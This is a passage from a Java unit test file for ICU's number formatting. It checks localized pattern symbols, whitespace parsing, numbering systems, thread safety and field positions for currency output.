DecimalFormatSymbols.getAvailableLocales\");\n        } else {\n            logln(\"PASS: \" + allULocales.length +\n                    \" available locales returned by DecimalFormatSymbols.getAvailableULocales\");\n        }\n    }\n\n    @Test\n    public void TestLocalizedPatternSymbolCoverage() {\n        String[] standardPatterns = { \"#,##0.05+%;#,##0.05-%\", \"* @@@E0‰\" };\n        String[] standardPatterns58 = { \"#,##0.05+%;#,##0.05-%\", \"* @@@E0‰;* -@@@E0‰\" };\n        String[] localizedPatterns = { \"▰⁖▰▰໐⁘໐໕†⁜⁙▰⁖▰▰໐⁘໐໕‡⁜\", \"⁂ ⁕⁕⁕⁑⁑໐‱\" };\n        String[] localizedPatterns58 = { \"▰⁖▰▰໐⁘໐໕+⁜⁙▰⁖▰▰໐⁘໐໕‡⁜\", \"⁂ ⁕⁕⁕⁑⁑໐‱⁙⁂ ‡⁕⁕⁕⁑⁑໐‱\" };\n\n        DecimalFormatSymbols dfs = new DecimalFormatSymbols();\n        dfs.setGroupingSeparator('⁖');\n        dfs.setDecimalSeparator('⁘');\n        dfs.setPatternSeparator('⁙');\n        dfs.setDigit('▰');\n        dfs.setZeroDigit('໐');\n        dfs.setSignificantDigit('⁕');\n        dfs.setPlusSign('†');\n        dfs.setMinusSign('‡');\n        dfs.setPercent('⁜');\n        dfs.setPerMill('‱');\n        dfs.setExponentSeparator(\"⁑⁑\"); // tests multi-char sequence\n        dfs.setPadEscape('⁂');\n\n        for (int i=0; i<2; i++) {\n            String standardPattern = standardPatterns[i];\n            String standardPattern58 = standardPatterns58[i];\n            String localizedPattern = localizedPatterns[i];\n            String localizedPattern58 = localizedPatterns58[i];\n\n            DecimalFormat df1 = new DecimalFormat(\"#\", dfs);\n            df1.applyPattern(standardPattern);\n            DecimalFormat df2 = new DecimalFormat(\"#\", dfs);\n            df2.applyLocalizedPattern(localizedPattern);\n            assertEquals(\"DecimalFormat instances should be equal\",\n                    df1, df2);\n            assertEquals(\"toPattern should match on localizedPattern instance\",\n                    standardPattern, df2.toPattern());\n            assertEquals(\"toLocalizedPattern should match on standardPattern instance\",\n                    localizedPattern, df1.toLocalizedPattern());\n\n            // Android can't access DecimalFormat_ICU58 for testing (ticket #13283).\n            if (TestUtil.getJavaVendor() == TestUtil.JavaVendor.Android) continue;\n\n            // Note: ICU 58 does not support plus signs in patterns\n            // Note: ICU 58 always prints the negative part of scientific notation patterns,\n            //       even when the negative part is not necessary\n            DecimalFormat_ICU58 df3 = new DecimalFormat_ICU58(\"#\", dfs);\n            df3.applyPattern(standardPattern); // Reading standardPattern is OK\n            DecimalFormat_ICU58 df4 = new DecimalFormat_ICU58(\"#\", dfs);\n            df4.applyLocalizedPattern(localizedPattern58);\n            // Note: DecimalFormat#equals() is broken on ICU 58\n            assertEquals(\"toPattern should match on ICU58 localizedPattern instance\",\n                    standardPattern58, df4.toPattern());\n            assertEquals(\"toLocalizedPattern should match on ICU58 standardPattern instance\",\n                    localizedPattern58, df3.toLocalizedPattern());\n        }\n    }\n\n    @Test\n    public void TestParseNull() throws ParseException {\n        DecimalFormat df = new DecimalFormat();\n        try {\n            df.parse(null);\n            fail(\"df.parse(null) didn't throw an exception\");\n        } catch (IllegalArgumentException e){}\n        try {\n            df.parse(null, null);\n            fail(\"df.parse(null) didn't throw an exception\");\n        } catch (IllegalArgumentException e){}\n        try {\n            df.parseCurrency(null, null);\n            fail(\"df.parse(null) didn't throw an exception\");\n        } catch (IllegalArgumentException e){}\n    }\n\n    @Test\n    public void TestWhiteSpaceParsing() {\n        DecimalFormatSymbols US = new DecimalFormatSymbols(Locale.US);\n        DecimalFormat fmt = new DecimalFormat(\"a  b#0c  \", US);\n        int n = 1234;\n        expect(fmt, \"a b1234c \", n);\n        expect(fmt, \"a   b1234c   \", n);\n        expect(fmt, \"ab1234\", n);\n\n        fmt.applyPattern(\"a b #\");\n        expect(fmt, \"ab1234\", n);\n        expect(fmt, \"ab  1234\", n);\n        expect(fmt, \"a b1234\", n);\n        expect(fmt, \"a   b1234\", n);\n        expect(fmt, \" a b 1234\", n);\n\n        // Horizontal whitespace is allowed, but not vertical whitespace.\n        expect(fmt, \"\\ta\\u00A0b\\u20001234\", n);\n        expect(fmt, \"a   \\u200A    b1234\", n);\n        expectParseException(fmt, \"\\nab1234\", n);\n        expectParseException(fmt, \"a    \\n   b1234\", n);\n        expectParseException(fmt, \"a    \\u0085   b1234\", n);\n        expectParseException(fmt, \"a    \\u2028   b1234\", n);\n\n        // Test all characters in the UTS 18 \"blank\" set stated in the API docstring.\n        UnicodeSet blanks = new UnicodeSet(\"[[:Zs:][\\\\u0009]]\").freeze();\n        for (String space : blanks) {\n            String str = \"a \" + space + \" b1234c  \";\n            expect(fmt, str, n);\n        }\n\n        // Arbitrary whitespace is not accepted in strict mode.\n        fmt.setParseStrict(true);\n        for (String space : blanks) {\n            String str = \"a \" + space + \" b1234c  \";\n            expectParseException(fmt, str, n);\n        }\n\n        // Test default ignorable characters.  These should work in both lenient and strict.\n        UnicodeSet defaultIgnorables = new UnicodeSet(\"[[:Bidi_Control:]]\").freeze();\n        fmt.setParseStrict(false);\n        for (String ignorable : defaultIgnorables) {\n            String str = \"a b \" + ignorable + \"1234c  \";\n            expect(fmt, str, n);\n        }\n        fmt.setParseStrict(true);\n        for (String ignorable : defaultIgnorables) {\n            String str = \"a b \" + ignorable + \"1234c  \";\n            expect(fmt, str, n);\n        }\n\n        // Test that other whitespace characters do not work\n        fmt.setParseStrict(false);\n        UnicodeSet otherWhitespace = new UnicodeSet(\"[[:whitespace:]]\").removeAll(blanks).freeze();\n        for (String space : otherWhitespace) {\n            String str = \"a  \" + space + \"  b1234\";\n            expectParseException(fmt, str, n);\n        }\n    }\n\n    /**\n     * Test currencies whose display name is a ChoiceFormat.\n     */\n    @Test\n    public void TestComplexCurrency() {\n        //  CLDR No Longer uses complex currency symbols.\n        //  Skipping this test.\n        //        Locale loc = new Locale(\"kn\", \"IN\", \"\");\n        //        NumberFormat fmt = NumberFormat.getCurrencyInstance(loc);\n\n        //        expect2(fmt, 1.0, \"Re.\\u00a01.00\");\n        //        expect(fmt, 1.001, \"Re.\\u00a01.00\"); // tricky\n        //        expect2(fmt, 12345678.0, \"Rs.\\u00a01,23,45,678.00\");\n        //        expect2(fmt, 0.5, \"Rs.\\u00a00.50\");\n        //        expect2(fmt, -1.0, \"-Re.\\u00a01.00\");\n        //        expect2(fmt, -10.0, \"-Rs.\\u00a010.00\");\n    }\n\n    @Test\n    public void TestCurrencyKeyword() {\n        ULocale locale = new ULocale(\"th_TH@currency=QQQ\");\n        NumberFormat format = NumberFormat.getCurrencyInstance(locale);\n        String result = format.format(12.34f);\n        if (!\"QQQ 12.34\".equals(result)) {\n            errln(\"got unexpected currency: \" + result);\n        }\n    }\n\n    /**\n     * Test alternate numbering systems\n     */\n    @Test\n    public void TestNumberingSystems() {\n        class TestNumberingSystemItem {\n            private final String localeName;\n            private final double value;\n            private final boolean isRBNF;\n            private final String expectedResult;\n\n            TestNumberingSystemItem(String loc, double val, boolean rbnf, String exp) {\n                localeName  = loc;\n                value = val;\n                isRBNF = rbnf;\n                expectedResult = exp;\n            }\n        }\n\n        final TestNumberingSystemItem[] DATA = {\n                new TestNumberingSystemItem( \"en_US@numbers=thai\",        1234.567, false, \"\\u0e51,\\u0e52\\u0e53\\u0e54.\\u0e55\\u0e56\\u0e57\" ),\n                new TestNumberingSystemItem( \"en_US@numbers=thai\",        1234.567, false, \"\\u0E51,\\u0E52\\u0E53\\u0E54.\\u0E55\\u0E56\\u0E57\" ),\n                new TestNumberingSystemItem( \"en_US@numbers=hebr\",        5678.0,   true,  \"\\u05D4\\u05F3\\u05EA\\u05E8\\u05E2\\u05F4\\u05D7\" ),\n                new TestNumberingSystemItem( \"en_US@numbers=arabext\",     1234.567, false, \"\\u06F1\\u066c\\u06F2\\u06F3\\u06F4\\u066b\\u06F5\\u06F6\\u06F7\" ),\n                new TestNumberingSystemItem( \"de_DE@numbers=foobar\",      1234.567, false, \"1.234,567\" ),\n                new TestNumberingSystemItem( \"ar_EG\",                     1234.567, false, \"\\u0661\\u066c\\u0662\\u0663\\u0664\\u066b\\u0665\\u0666\\u0667\" ),\n                new TestNumberingSystemItem( \"th_TH@numbers=traditional\", 1234.567, false, \"\\u0E51,\\u0E52\\u0E53\\u0E54.\\u0E55\\u0E56\\u0E57\" ), // fall back to native per TR35\n                new TestNumberingSystemItem( \"ar_MA\",                     1234.567, false, \"1.234,567\" ),\n                new TestNumberingSystemItem( \"en_US@numbers=hanidec\",     1234.567, false, \"\\u4e00,\\u4e8c\\u4e09\\u56db.\\u4e94\\u516d\\u4e03\" ),\n                new TestNumberingSystemItem( \"ta_IN@numbers=native\",      1234.567, false, \"\\u0BE7,\\u0BE8\\u0BE9\\u0BEA.\\u0BEB\\u0BEC\\u0BED\" ),\n                new TestNumberingSystemItem( \"ta_IN@numbers=traditional\", 1235.0,   true,  \"\\u0BF2\\u0BE8\\u0BF1\\u0BE9\\u0BF0\\u0BEB\" ),\n                new TestNumberingSystemItem( \"ta_IN@numbers=finance\",     1234.567, false, \"1,234.567\" ), // fall back to default per TR35\n                new TestNumberingSystemItem( \"zh_TW@numbers=native\",      1234.567, false, \"\\u4e00,\\u4e8c\\u4e09\\u56db.\\u4e94\\u516d\\u4e03\" ),\n                new TestNumberingSystemItem( \"zh_TW@numbers=traditional\", 1234.567, true,  \"\\u4E00\\u5343\\u4E8C\\u767E\\u4E09\\u5341\\u56DB\\u9EDE\\u4E94\\u516D\\u4E03\" ),\n                new TestNumberingSystemItem( \"zh_TW@numbers=finance\",     1234.567, true,  \"\\u58F9\\u4EDF\\u8CB3\\u4F70\\u53C3\\u62FE\\u8086\\u9EDE\\u4F0D\\u9678\\u67D2\" ),\n                new TestNumberingSystemItem( \"en_US@numbers=mathsanb\",    1234.567, false,  \"𝟭,𝟮𝟯𝟰.𝟱𝟲𝟳\" ), // ticket #13286\n        };\n\n\n        for (TestNumberingSystemItem item : DATA) {\n            ULocale loc = new ULocale(item.localeName);\n            NumberFormat fmt = NumberFormat.getInstance(loc);\n            if (item.isRBNF) {\n                expect3(fmt,item.value,item.expectedResult);\n            } else {\n                expect2(fmt,item.value,item.expectedResult);\n            }\n        }\n    }\n\n    // Coverage tests for methods not being called otherwise.\n    @Test\n    public void TestNumberingSystemCoverage() {\n        // Test getAvaliableNames\n        String[] availableNames = NumberingSystem.getAvailableNames();\n        if (availableNames == null || availableNames.length <= 0) {\n            errln(\"ERROR: NumberingSystem.getAvailableNames() returned a null or empty array.\");\n        } else {\n            boolean latnFound = false;\n            for (String name : availableNames){\n                if (\"latn\".equals(name)) {\n                    latnFound = true;\n                    break;\n                }\n            }\n\n            if (!latnFound) {\n                errln(\"ERROR: 'latn' numbering system not found on NumberingSystem.getAvailableNames().\");\n            }\n        }\n\n        // Test NumberingSystem.getInstance()\n        NumberingSystem ns1 = NumberingSystem.getInstance();\n        if (ns1 == null || ns1.isAlgorithmic()) {\n            errln(\"ERROR: NumberingSystem.getInstance() returned a null or invalid NumberingSystem\");\n        }\n\n        // Test NumberingSystem.getInstance(int,boolean,String)\n        /* Parameters used: the ones used in the default constructor\n         * radix = 10;\n         * algorithmic = false;\n         * desc = \"0123456789\";\n         */\n        NumberingSystem ns2 = NumberingSystem.getInstance(10, false, \"0123456789\");\n        if (ns2 == null || ns2.isAlgorithmic()) {\n            errln(\"ERROR: NumberingSystem.getInstance(int,boolean,String) returned a null or invalid NumberingSystem\");\n        }\n\n        // Test NumberingSystem.getInstance(Locale)\n        NumberingSystem ns3 = NumberingSystem.getInstance(Locale.ENGLISH);\n        if (ns3 == null || ns3.isAlgorithmic()) {\n            errln(\"ERROR: NumberingSystem.getInstance(Locale) returned a null or invalid NumberingSystem\");\n        }\n    }\n\n    @Test\n    public void Test6816() {\n        Currency cur1 = Currency.getInstance(new Locale(\"und\", \"PH\"));\n\n        NumberFormat nfmt = NumberFormat.getCurrencyInstance(new Locale(\"und\", \"PH\"));\n        DecimalFormatSymbols decsym = ((DecimalFormat)nfmt).getDecimalFormatSymbols();\n        Currency cur2 = decsym.getCurrency();\n\n        if ( !cur1.getCurrencyCode().equals(\"PHP\") || !cur2.getCurrencyCode().equals(\"PHP\")) {\n            errln(\"FAIL: Currencies should match PHP: cur1 = \"+cur1.getCurrencyCode()+\"; cur2 = \"+cur2.getCurrencyCode());\n        }\n\n    }\n\n    @Test\n    public void TestThreadedFormat() {\n\n        class FormatTask implements Runnable {\n            DecimalFormat fmt;\n            StringBuffer buf;\n            boolean inc;\n            float num;\n\n            FormatTask(DecimalFormat fmt, int index) {\n                this.fmt = fmt;\n                this.buf = new StringBuffer();\n                this.inc = (index & 0x1) == 0;\n                this.num = inc ? 0 : 10000;\n            }\n\n            @Override\n            public void run() {\n                if (inc) {\n                    while (num < 10000) {\n                        buf.append(fmt.format(num) + \"\\n\");\n                        num += 3.14159;\n                    }\n                } else {\n                    while (num > 0) {\n                        buf.append(fmt.format(num) + \"\\n\");\n                        num -= 3.14159;\n                    }\n                }\n            }\n\n            String result() {\n                return buf.toString();\n            }\n        }\n\n        DecimalFormat fmt = new DecimalFormat(\"0.####\");\n        FormatTask[] tasks = new FormatTask[8];\n        for (int i = 0; i < tasks.length; ++i) {\n            tasks[i] = new FormatTask(fmt, i);\n        }\n\n        TestUtil.runUntilDone(tasks);\n\n        for (int i = 2; i < tasks.length; i++) {\n            String str1 = tasks[i].result();\n            String str2 = tasks[i-2].result();\n            if (!str1.equals(str2)) {\n                System.out.println(\"mismatch at \" + i);\n                System.out.println(str1);\n                System.out.println(str2);\n                errln(\"decimal format thread mismatch\");\n\n                break;\n            }\n            str1 = str2;\n        }\n    }\n\n    @Test\n    public void TestPerMill() {\n        DecimalFormat fmt = new DecimalFormat(\"###.###\\u2030\");\n        assertEquals(\"0.4857 x ###.###\\u2030\",\n                \"485.7\\u2030\", fmt.format(0.4857));\n\n        DecimalFormatSymbols sym = new DecimalFormatSymbols(Locale.ENGLISH);\n        sym.setPerMill('m');\n        DecimalFormat fmt2 = new DecimalFormat(\"\", sym);\n        fmt2.applyLocalizedPattern(\"###.###m\");\n        assertEquals(\"0.4857 x ###.###m\",\n                \"485.7m\", fmt2.format(0.4857));\n    }\n\n    @Test\n    public void TestIllegalPatterns() {\n        // Test cases:\n        // Prefix with \"-:\" for illegal patterns\n        // Prefix with \"+:\" for legal patterns\n        String DATA[] = {\n                // Unquoted special characters in the suffix are illegal\n                \"-:000.000|###\",\n                \"+:000.000'|###'\",\n        };\n        for (int i=0; i<DATA.length; ++i) {\n            String pat=DATA[i];\n            boolean valid = pat.charAt(0) == '+';\n            pat = pat.substring(2);\n            Exception e = null;\n            try {\n                // locale doesn't matter here\n                new DecimalFormat(pat);\n            } catch (IllegalArgumentException e1) {\n                e = e1;\n            } catch (IndexOutOfBoundsException e1) {\n                e = e1;\n            }\n            String msg = (e==null) ? \"success\" : e.getMessage();\n            if ((e==null) == valid) {\n                logln(\"Ok: pattern \\\"\" + pat + \"\\\": \" + msg);\n            } else {\n                errln(\"FAIL: pattern \\\"\" + pat + \"\\\" should have \" +\n                        (valid?\"succeeded\":\"failed\") + \"; got \" + msg);\n            }\n        }\n    }\n\n    /**\n     * Parse a CurrencyAmount using the given NumberFormat, with\n     * the 'delim' character separating the number and the currency.\n     */\n    private static CurrencyAmount parseCurrencyAmount(String str, NumberFormat fmt,\n            char delim)\n                    throws ParseException {\n        int i = str.indexOf(delim);\n        return new CurrencyAmount(fmt.parse(str.substring(0,i)),\n                Currency.getInstance(str.substring(i+1)));\n    }\n\n    /**\n     * Return an integer representing the next token from this\n     * iterator.  The integer will be an index into the given list, or\n     * -1 if there are no more tokens, or -2 if the token is not on\n     * the list.\n     */\n    private static int keywordIndex(String tok) {\n        for (int i=0; i<KEYWORDS.length; ++i) {\n            if (tok.equals(KEYWORDS[i])) {\n                return i;\n            }\n        }\n        return -1;\n    }\n\n    private static final String KEYWORDS[] = {\n        /*0*/ \"ref=\", // <reference pattern to parse numbers>\n        /*1*/ \"loc=\", // <locale for formats>\n        /*2*/ \"f:\",   // <pattern or '-'> <number> <exp. string>\n        /*3*/ \"fp:\",  // <pattern or '-'> <number> <exp. string> <exp. number>\n        /*4*/ \"rt:\",  // <pattern or '-'> <(exp.) number> <(exp.) string>\n        /*5*/ \"p:\",   // <pattern or '-'> <string> <exp. number>\n        /*6*/ \"perr:\", // <pattern or '-'> <invalid string>\n        /*7*/ \"pat:\", // <pattern or '-'> <exp. toPattern or '-' or 'err'>\n        /*8*/ \"fpc:\", // <loc or '-'> <curr.amt> <exp. string> <exp. curr.amt>\n        /*9*/ \"strict=\", // true or false\n    };\n\n    @SuppressWarnings(\"resource\")  // InputStream is will be closed by the ResourceReader.\n    @Test\n    public void TestCases() {\n        String caseFileName = \"NumberFormatTestCases.txt\";\n        java.io.InputStream is = NumberFormatTest.class.getResourceAsStream(caseFileName);\n\n        ResourceReader reader = new ResourceReader(is, caseFileName, \"utf-8\");\n        TokenIterator tokens = new TokenIterator(reader);\n\n        Locale loc = new Locale(\"en\", \"US\", \"\");\n        DecimalFormat ref = null, fmt = null;\n        MeasureFormat mfmt = null;\n        String pat = null, str = null, mloc = null;\n        boolean strict = false;\n\n        try {\n            for (;;) {\n                String tok = tokens.next();\n                if (tok == null) {\n                    break;\n                }\n                String where = \"(\" + tokens.getLineNumber() + \") \";\n                int cmd = keywordIndex(tok);\n                switch (cmd) {\n                case 0:\n                    // ref= <reference pattern>\n                    ref = new DecimalFormat(tokens.next(),\n                            new DecimalFormatSymbols(Locale.US));\n                    ref.setParseStrict(strict);\n                    logln(\"Setting reference pattern to:\\t\" + ref);\n                    break;\n                case 1:\n                    // loc= <locale>\n                    loc = LocaleUtility.getLocaleFromName(tokens.next());\n                    pat = ((DecimalFormat) NumberFormat.getInstance(loc)).toPattern();\n                    logln(\"Setting locale to:\\t\" + loc + \", \\tand pattern to:\\t\" + pat);\n                    break;\n                case 2: // f:\n                case 3: // fp:\n                case 4: // rt:\n                case 5: // p:\n                    tok = tokens.next();\n                    if (!tok.equals(\"-\")) {\n                        pat = tok;\n                    }\n                    try {\n                        fmt = new DecimalFormat(pat, new DecimalFormatSymbols(loc));\n                        fmt.setParseStrict(strict);\n                    } catch (IllegalArgumentException iae) {\n                        errln(where + \"Pattern \\\"\" + pat + '\"');\n                        iae.printStackTrace();\n                        tokens.next(); // consume remaining tokens\n                        //tokens.next();\n                        if (cmd == 3) tokens.next();\n                        continue;\n                    }\n                    str = null;\n                    try {\n                        if (cmd == 2 || cmd == 3 || cmd == 4) {\n                            // f: <pattern or '-'> <number> <exp. string>\n                            // fp: <pattern or '-'> <number> <exp. string> <exp. number>\n                            // rt: <pattern or '-'> <number> <string>\n                            String num = tokens.next();\n                            str = tokens.next();\n                            Number n = ref.parse(num);\n                            assertEquals(where + '\"' + pat + \"\\\".format(\" + num + \")\",\n                                    str, fmt.format(n));\n                            if (cmd == 3) { // fp:\n                                n = ref.parse(tokens.next());\n                            }\n                            if (cmd != 2) { // != f:\n                                assertEquals(where + '\"' + pat + \"\\\".parse(\\\"\" + str + \"\\\")\",\n                                        n, fmt.parse(str));\n                            }\n                        }\n                        // p: <pattern or '-'> <string to parse> <exp. number>\n                        else {\n                            str = tokens.next();\n                            String expstr = tokens.next();\n                            Number parsed = fmt.parse(str);\n                            Number exp = ref.parse(expstr);\n                            assertEquals(where + '\"' + pat + \"\\\".parse(\\\"\" + str + \"\\\")\",\n                                    exp, parsed);\n                        }\n                    } catch (ParseException e) {\n                        errln(where + '\"' + pat + \"\\\".parse(\\\"\" + str +\n                                \"\\\") threw an exception\");\n                        e.printStackTrace();\n                    }\n                    break;\n                case 6:\n                    // perr: <pattern or '-'> <invalid string>\n                    errln(\"Under construction\");\n                    return;\n                case 7:\n                    // pat: <pattern> <exp. toPattern, or '-' or 'err'>\n                    String testpat = tokens.next();\n                    String exppat  = tokens.next();\n                    boolean err    = exppat.equals(\"err\");\n                    if (testpat.equals(\"-\")) {\n                        if (err) {\n                            errln(\"Invalid command \\\"pat: - err\\\" at \" +  tokens.describePosition());\n                            continue;\n                        }\n                        testpat = pat;\n                    }\n                    if (exppat.equals(\"-\")) exppat = testpat;\n                    try {\n                        DecimalFormat f = null;\n                        if (testpat == pat) { // [sic]\n                            f = fmt;\n                        } else {\n                            f = new DecimalFormat(testpat);\n                            f.setParseStrict(strict);\n                        }\n                        if (err) {\n                            errln(where + \"Invalid pattern \\\"\" + testpat +\n                                    \"\\\" was accepted\");\n                        } else {\n                            assertEquals(where + '\"' + testpat + \"\\\".toPattern()\",\n                                    exppat, f.toPattern());\n                        }\n                    } catch (IllegalArgumentException iae2) {\n                        if (err) {\n                            logln(\"Ok: \" + where + \"Invalid pattern \\\"\" + testpat +\n                                    \"\\\" threw an exception\");\n                        } else {\n                            errln(where + \"Valid pattern \\\"\" + testpat +\n                                    \"\\\" threw an exception\");\n                            iae2.printStackTrace();\n                        }\n                    }\n                    break;\n                case 8: // fpc:\n                    tok = tokens.next();\n                    if (!tok.equals(\"-\")) {\n                        mloc = tok;\n                        ULocale l = new ULocale(mloc);\n                        try {\n                            mfmt = MeasureFormat.getCurrencyFormat(l);\n                        } catch (IllegalArgumentException iae) {\n                            errln(where + \"Loc \\\"\" + tok + '\"');\n                            iae.printStackTrace();\n                            tokens.next(); // consume remaining tokens\n                            tokens.next();\n                            tokens.next();\n                            continue;\n                        }\n                    }\n                    str = null;\n                    try {\n                        // fpc: <loc or '-'> <curr.amt> <exp. string> <exp. curr.amt>\n                        String currAmt = tokens.next();\n                        str = tokens.next();\n                        CurrencyAmount target = parseCurrencyAmount(currAmt, ref, '/');\n                        String formatResult = mfmt.format(target);\n                        assertEquals(where + \"getCurrencyFormat(\" + mloc + \").format(\" + currAmt + \")\",\n                                str, formatResult);\n                        target = parseCurrencyAmount(tokens.next(), ref, '/');\n                        CurrencyAmount parseResult = (CurrencyAmount) mfmt.parseObject(str);\n                        assertEquals(where + \"getCurrencyFormat(\" + mloc + \").parse(\\\"\" + str + \"\\\")\",\n                                target, parseResult);\n                    } catch (ParseException e) {\n                        errln(where + '\"' + pat + \"\\\".parse(\\\"\" + str +\n                                \"\\\") threw an exception\");\n                        e.printStackTrace();\n                    }\n                    break;\n                case 9: // strict= true or false\n                    strict = \"true\".equalsIgnoreCase(tokens.next());\n                    logln(\"Setting strict to:\\t\" + strict);\n                    break;\n                case -1:\n                    errln(\"Unknown command \\\"\" + tok + \"\\\" at \" + tokens.describePosition());\n                    return;\n                }\n            }\n        } catch (java.io.IOException e) {\n            throw new RuntimeException(e);\n        } finally {\n            try {\n                reader.close();\n            } catch (IOException ignored) {\n            }\n        }\n    }\n\n    @Test\n    public void TestFieldPositionDecimal() {\n        DecimalFormat nf = (DecimalFormat) com.ibm.icu.text.NumberFormat.getInstance(ULocale.ENGLISH);\n        nf.setPositivePrefix(\"FOO\");\n        nf.setPositiveSuffix(\"BA\");\n        StringBuffer buffer = new StringBuffer();\n        FieldPosition fp = new FieldPosition(NumberFormat.Field.DECIMAL_SEPARATOR);\n        nf.format(35.47, buffer, fp);\n        assertEquals(\"35.47\", \"FOO35.47BA\", buffer.toString());\n        assertEquals(\"fp begin\", 5, fp.getBeginIndex());\n        assertEquals(\"fp end\", 6, fp.getEndIndex());\n    }\n\n    @Test\n    public void TestFieldPositionInteger() {\n        DecimalFormat nf = (DecimalFormat) com.ibm.icu.text.NumberFormat.getInstance(ULocale.ENGLISH);\n        nf.setPositivePrefix(\"FOO\");\n        nf.setPositiveSuffix(\"BA\");\n        StringBuffer buffer = new StringBuffer();\n        FieldPosition fp = new FieldPosition(NumberFormat.Field.INTEGER);\n        nf.format(35.47, buffer, fp);\n        assertEquals(\"35.47\", \"FOO35.47BA\", buffer.toString());\n        assertEquals(\"fp begin\", 3, fp.getBeginIndex());\n        assertEquals(\"fp end\", 5, fp.getEndIndex());\n    }\n\n    @Test\n    public void TestFieldPositionFractionButInteger() {\n        DecimalFormat nf = (DecimalFormat) com.ibm.icu.text.NumberFormat.getInstance(ULocale.ENGLISH);\n        nf.setPositivePrefix(\"FOO\");\n        nf.setPositiveSuffix(\"BA\");\n        StringBuffer buffer = new StringBuffer();\n        FieldPosition fp = new FieldPosition(NumberFormat.Field.FRACTION);\n        nf.format(35, buffer, fp);\n        assertEquals(\"35\", \"FOO35BA\", buffer.toString());\n        assertEquals(\"fp begin\", 5, fp.getBeginIndex());\n        assertEquals(\"fp end\", 5, fp.getEndIndex());\n    }\n\n    @Test\n    public void TestFieldPositionFraction() {\n        DecimalFormat nf = (DecimalFormat) com.ibm.icu.text.NumberFormat.getInstance(ULocale.ENGLISH);\n        nf.setPositivePrefix(\"FOO\");\n        nf.setPositiveSuffix(\"BA\");\n        StringBuffer buffer = new StringBuffer();\n        FieldPosition fp = new FieldPosition(NumberFormat.Field.FRACTION);\n        nf.format(35.47, buffer, fp);\n        assertEquals(\"35.47\", \"FOO35.47BA\", buffer.toString());\n        assertEquals(\"fp begin\", 6, fp.getBeginIndex());\n        assertEquals(\"fp end\", 8, fp.getEndIndex());\n    }\n\n    @Test\n    public void TestFieldPositionCurrency() {\n        DecimalFormat nf = (DecimalFormat) com.ibm.icu.text.NumberFormat.getCurrencyInstance(Locale.US);\n        double amount = 35.47;\n        double negAmount = -34.567;\n        FieldPosition cp = new FieldPosition(NumberFormat.Field.CURRENCY);\n\n        StringBuffer buffer0 = new StringBuffer();\n        nf.format(amount, buffer0, cp);\n        assertEquals(\"$35.47\", \"$35.47\", buffer0.toString());\n        assertEquals(\"cp begin\", 0, cp.getBeginIndex());\n        assertEquals(\"cp end\", 1, cp.getEndIndex());\n\n        StringBuffer buffer01 = new StringBuffer();\n        nf.format(negAmount, buffer01, cp);\n        assertEquals(\"-$34.57\", \"-$34.57\", buffer01.toString());\n        assertEquals(\"cp begin\", 1, cp.getBeginIndex());\n        assertEquals(\"cp end\", 2, cp.getEndIndex());\n\n        nf.setCurrency(Currency.getInstance(Locale.FRANCE));\n        StringBuffer buffer1 = new StringBuffer();\n        nf.format(amount, buffer1, cp);\n        assertEquals(\"€35.47\", \"€35.47\", buffer1.toString());\n        assertEquals(\"cp begin\", 0, cp.getBeginIndex());\n        assertEquals(\"cp end\", 1, cp.getEndIndex());\n\n        nf.setCurrency(Currency.getInstance(new Locale(\"fr\", \"ch\", \"\")));\n        StringBuffer buffer2 = new StringBuffer();\n        nf.format(amount, buffer2, cp);\n        assertEquals(\"CHF 35.47\", \"CHF 35.47\", buffer2.toString());\n        assertEquals(\"cp begin\", 0, cp.getBeginIndex());\n        assertEquals(\"cp end\", 3, cp.getEndIndex());\n\n        StringBuffer buffer20 = new StringBuffer();\n        nf.format(negAmount, buffer20, cp);\n        assertEquals(\"-CHF 34.57\", \"-CHF 34.57\", buffer20.toString());\n        assertEquals(\"cp begin\", 1, cp.getBeginIndex());\n        assertEquals(\"cp end\", 4, cp.getEndIndex());\n\n        nf = (DecimalFormat) com.ibm.icu.text.NumberFormat.getCurrencyInstance(Locale.FRANCE);\n        StringBuffer buffer3 = new StringBuffer();\n        nf.format(amount, buffer3, cp);\n        assertEquals(\"35,47 €\", \"35,47 €\", buffer3.toString());\n        assertEquals(\"cp begin\", 6, cp.getBeginIndex());\n        assertEquals(\"cp end\", 7, cp.getEndIndex());\n\n        StringBuffer buffer4 = new StringBuffer();\n        nf.format(negAmount, buffer4, cp);\n        assertEquals(\"-34,57 €\", \"-34,57 €\", buffer4.toString());\n        assertEquals(\"cp begin\", 7, cp.getBeginIndex());\n        assertEquals(\"cp end\", 8, cp.getEndIndex());\n\n        nf.setCurrency(Currency.getInstance(new Locale(\"fr\", \"ch\")));\n        StringBuffer buffer5 = new StringBuffer();\n        nf.format(negAmount, buffer5, cp);\n        assertEquals(\"-34,57 CHF\", \"-34,57 CHF\", buffer5.toString());\n        assertEquals(\"cp begin\", 7, cp.getBeginIndex());\n        assertEquals(\"cp end\", 10, cp.getEndIndex());\n\n        NumberFormat plCurrencyFmt = NumberFormat.getInstance(new Locale(\"fr\", \"ch\"), NumberFormat.PLURALCURRENCYSTYLE);\n        StringBuffer buffer6 = new StringBuffer();\n        plCurrencyFmt.format(negAmount, buffer6, cp);\n        assertEquals(\"-34.57 francs suisses\", \"-34.57 francs suisses\", buffer6.toString());\n        assertEquals(\"cp begin\", 7, cp.getBeginIndex());\n        assertEquals(\"cp end\", 21, cp.getEndIndex());\n\n        // Positive value with PLURALCURRENCYSTYLE.\n        plCurrencyFmt = NumberFormat.getInstance(new Locale(\"ja\", \"ch\"), NumberFormat.PLURALCURRENCYSTYLE);\n        StringBuffer buffer7 = new StringBuffer();\n        plCurrencyFmt.format(amount, buffer7, cp);\n        assertEquals(\"35.47 スイス フラン\", \"35.47 スイス フラン\", buffer7.toString());\n        assertEquals(\"cp begin\", 6, cp.getBeginIndex());\n        assertEquals(\"cp end\", 13, cp.getEndIndex());\n\n        // PLURALCURRENCYSTYLE for non-ASCII.\n        plCurrencyFmt = NumberFormat.getInstance(new Locale(\"ja\", \"de\"), NumberFormat.PLURALCURRENCYSTYLE);\n        StringBuffer buffer8 = new StringBuffer();\n        plCurrencyFmt.format(negAmount, buffer8, cp);\n        assertEquals(\"-34.57 ユーロ\", \"-34.57 ユーロ\", buffer8.toString());\n        assertEquals(\"cp begin\", 7, cp.getBeginIndex());\n        assertEquals(\"cp end\", 10, cp.getEndIndex());\n\n        nf = (DecimalFormat) com.ibm.icu.text.NumberFormat.getCurrencyInstance(Locale.JAPAN);\n        nf.setCurrency(Currency.getInstance(new Locale(\"ja\", \"jp\")));\n        StringBuffer buffer9 = new StringBuffer();\n        nf.format(negAmount, buffer9, cp);\n        